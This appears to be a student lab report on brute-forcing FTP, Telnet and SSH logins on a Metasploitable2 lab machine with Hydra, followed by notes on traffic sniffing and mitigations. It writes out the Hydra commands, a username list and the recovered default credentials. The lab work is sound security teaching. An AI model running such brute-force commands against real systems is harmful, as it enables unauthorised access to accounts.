**Labwork 1:👾Brute Force and Sniffing**
    
**🔨Tools Used**
   
Hydra – for brute force attacks
Wireshark – for sniffing and analyzing traffic
Kali Linux – attacker machine
Metasploitable2 – vulnerable target machine
ftp, telnet, ssh – for manual login and testing

**Finding the Metasploit IP**

**1. Enumeration of Usernames🥐**
    Initial usernames used for brute force attacks were manually prepared in a file usernames.txt:
    - msfadmin
    - user
    - admin
    - root
    - test
    - guest

**2. Brute Force Attacks🥖**

**2.1 FTP**
    - Tool: Hydra
    - Command Used:
        
          hydra -L usernames.txt -P passwords.txt ftp://192.168.154.133

Result: Successful login found – msfadmin:msfadmin

**2.2 Telnet**
    - Tool: Hydra
    - Command Used:
       
        hydra -l msfadmin -P passwords.txt telnet://192.168.154.133

Result: Successful login – msfadmin:msfadmin



**2.3 SSH**
    - Tool: Hydra
    - Command Used:
        
        hydra -L usernames.txt -P passwords.txt ssh://192.168.154.133

Problem: Hydra (or the SSH client it's using) doesn't support the older key exchange algorithms used by the Meta2 machine, which is very outdated



**3. Sniffing Network Traffic🍖**

    Use the recovered credentials to log in to the respective services


    Use Wireshark or tcpdump to capture and analyze network traffic during the session.


    Identify which protocols transmit data in plaintext and which use encryption.


    Provide evidence (e.g., screenshots) to prove which protocols are secure and which are not.
    FTP


**Telnet**



**4.Problems Encountered**

    Protocol	Problem	Solution
    FTP	None	N/A
    Telnet	Service was off initially	Enabled Telnet on Metasploitable2
    SSH	Hydra connection failed due to key mismatch	Added weak algorithm support in SSH config

**5.Mitigation Strategies**

    Protocol	Vulnerability	Secure Alternative	Why it’s better
    FTP	Sends credentials in plaintext	SFTP / FTPS	Encrypts file transfer data and credentials
    Telnet	Transmits all in plaintext	SSH	SSH encrypts communication
    SSH	Still brute-forceable	Use key-based login, strong passwords	Prevents brute force access



